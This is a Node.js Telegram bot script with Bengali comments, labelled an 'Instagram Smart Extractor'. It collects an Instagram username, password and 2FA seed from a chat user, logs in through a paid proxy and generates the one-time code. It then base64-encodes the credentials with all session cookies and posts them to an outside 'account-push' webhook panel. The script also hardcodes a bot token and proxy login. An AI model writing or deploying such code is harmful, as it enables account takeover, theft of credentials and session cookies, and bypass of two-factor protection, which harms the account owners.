const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const { wrapper } = require('axios-cookiejar-support');
const { CookieJar } = require('tough-cookie');
const { authenticator } = require('otplib');
const { HttpsProxyAgent } = require('https-proxy-agent'); // প্রক্সি লাইব্রেরি
const http = require('http');

// Render-এর জন্য পোর্ট বাইন্ডিং
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Bot is running with Proxy Support\n');
}).listen(PORT);

const TOKEN = '7142079092:AAGHKZJ1K6BRQ7CckbNWeYyXmW05xGZ4FT8'; 
const WEBHOOK_URL = "https://ins.skysysx.com/api/api/v1/webhook/FlxhUHdINnPQxsBhqqpNw4L4nn_1ICQyCKKXoGBETCg/account-push";

// --- প্রক্সি সেটআপ ---
// আপনার NiceProxy ডিটেইলস
const proxyUrl = "http://s93_ueqa_SyjA-country-US:k8xFs3xLxxZJ@niceproxy.io:17521";
const proxyAgent = new HttpsProxyAgent(proxyUrl);

const bot = new TelegramBot(TOKEN, { polling: true });
const userStates = {};

console.log("বট প্রক্সি সহ চালু হয়েছে...");

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "🤖 **Instagram Smart Extractor (Proxy Mode)**\n\n👤 ইউজারনেম দিন:");
    userStates[msg.chat.id] = { step: 'username' };
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!userStates[chatId] || !text || text.startsWith('/')) return;

    let state = userStates[chatId];

    if (state.step === 'username') {
        state.username = text.trim();
        state.step = 'password';
        bot.sendMessage(chatId, "🔑 পাসওয়ার্ড দিন:");
    } 
    else if (state.step === 'password') {
        state.password = text.trim();
        state.step = '2fa';
        bot.sendMessage(chatId, "🔐 2FA Key (Seed) দিন:");
    } 
    else if (state.step === '2fa') {
        state.twoFactorKey = text.trim(); 
        bot.sendMessage(chatId, "⏳ প্রক্সি ব্যবহার করে লগইন করা হচ্ছে...");
        processLogin(chatId);
    }
});

async function processLogin(chatId) {
    const state = userStates[chatId];
    const jar = new CookieJar();
    
    // Axios এর সাথে প্রক্সি এজেন্ট যুক্ত করা
    const client = wrapper(axios.create({ 
        jar, 
        withCredentials: true,
        httpsAgent: proxyAgent, // প্রক্সি ব্যবহার হবে
        httpAgent: proxyAgent
    }));

    try {
        // ১. সেশন শুরু
        const initRes = await client.get('https://www.instagram.com/accounts/login/');
        const cookies = await jar.getCookies('https://www.instagram.com/');
        const csrf = cookies.find(c => c.key === 'csrftoken')?.value;

        if (!csrf) {
            return bot.sendMessage(chatId, "❌ এরর: প্রক্সি কাজ করছে না অথবা CSRF পাওয়া যায়নি।");
        }

        const headers = {
            'X-CSRFToken': csrf,
            'X-Instagram-AJAX': '1',
            'X-IG-App-ID': '936619743392459',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Content-Type': 'application/x-www-form-urlencoded'
        };

        const enc_password = `#PWD_INSTAGRAM_BROWSER:10:${Math.floor(Date.now() / 1000)}:${state.password}`;

        const payload = new URLSearchParams({
            enc_password: enc_password,
            username: state.username,
            queryParams: '{}',
            optIntoOneTap: 'false'
        });

        // ২. লগইন রিকোয়েস্ট
        let loginRes = await client.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', payload, { headers });

        if (loginRes.data.two_factor_required) {
            const otpCode = authenticator.generate(state.twoFactorKey.replace(/\s/g, ''));
            const twoFactorPayload = new URLSearchParams({
                username: state.username,
                verificationCode: otpCode,
                two_factor_identifier: loginRes.data.two_factor_info.two_factor_identifier,
                queryParams: '{}'
            });
            loginRes = await client.post('https://www.instagram.com/api/v1/web/accounts/two_factor_login/', twoFactorPayload, { headers });
        }

        if (loginRes.data.authenticated === true) {
            const finalCookies = await jar.getCookies('https://www.instagram.com/');
            const cookieStr = finalCookies.map(c => `${c.key}=${c.value}`).join('; ');
            const finalData = `${state.username}:${state.password}|||${cookieStr}||`;
            const b64Data = Buffer.from(finalData).toString('base64');

            const pushRes = await axios.post(WEBHOOK_URL, `accounts=${b64Data}`, {
                headers: { 'Content-Type': 'text/plain' }
            });

            bot.sendMessage(chatId, `✅ সফল!\n\n🚀 প্যানেল রেসপন্স: ${JSON.stringify(pushRes.data)}`);
        } else {
            bot.sendMessage(chatId, `❌ ব্যর্থ: ${loginRes.data.message || "পাসওয়ার্ড ভুল"}`);
        }
    } catch (err) {
        // যদি এখনও ৪২৯ আসে
        if (err.response && err.response.status === 429) {
            bot.sendMessage(chatId, "❌ এরর ৪২৯: এই প্রক্সি আইপিটিও ইনস্টাগ্রাম ব্লক করেছে। অন্য লোকেশনের প্রক্সি ট্রাই করুন।");
        } else {
            bot.sendMessage(chatId, `❌ টেকনিক্যাল এরর: ${err.message}`);
        }
    } finally {
        delete userStates[chatId];
    }
}
